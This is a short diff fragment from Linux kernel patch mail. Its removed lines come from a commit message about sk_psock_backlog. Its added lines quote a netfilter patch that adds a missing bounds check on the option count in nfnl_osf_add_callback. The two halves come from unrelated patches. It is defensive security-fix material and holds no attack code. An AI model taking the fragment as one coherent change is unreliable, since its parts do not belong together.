-in sk_psock_backlog(), since we can't prevent the skb from being appended
-to an ingress queue and consumed by user, as shown in trace 1 and trace 2.
+> Reported-by: Lucas Leong <wmliang@infosec.exchange>
+> Cc: stable@kernel.org
+> Signed-off-by: Wander Lairson Costa <wander@redhat.com>
+> ---
+>   net/netfilter/nfnetlink_osf.c | 3 +++
+>   1 file changed, 3 insertions(+)
+> 
+> diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.c
+> index 8f1bfa6ccc2d..13fedf2aaa0f 100644
+> --- a/net/netfilter/nfnetlink_osf.c
+> +++ b/net/netfilter/nfnetlink_osf.c
+> @@ -315,6 +315,9 @@ static int nfnl_osf_add_callback(struct sk_buff *skb,
+>   
+>   	f = nla_data(osf_attrs[OSF_ATTR_FINGER]);
+>   
+> +	if (f->opt_num > ARRAY_SIZE(f->opt))
+> +		return -EINVAL;
+> +
+>   	kf = kmalloc(sizeof(struct nf_osf_finger), GFP_KERNEL);
+>   	if (!kf)
+>   		return -ENOMEM;
 
